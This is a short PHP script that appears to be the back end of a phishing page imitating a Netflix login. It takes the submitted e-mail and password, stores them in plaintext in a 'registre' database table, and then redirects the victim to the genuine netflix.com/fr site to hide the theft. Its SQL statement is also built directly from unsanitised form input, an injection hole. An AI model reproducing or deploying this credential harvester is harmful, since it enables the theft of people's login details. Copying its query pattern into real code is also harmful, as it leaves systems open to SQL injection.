<?php
	require_once("cnx.php");

	$mail=$_POST['idlogin'];
    $pass=$_POST['idpass'];

    if(isset($_POST['idcheck'])){
    	$check="yes";
    }
    else{
    	$check = "no";
    }

	$cnx->exec("INSERT INTO registre (MAIL,PASS,NEW) VALUES ('$mail','$pass','$check')");
	echo $mail;

	header("Location: https://www.netflix.com/fr/");
	exit();
?>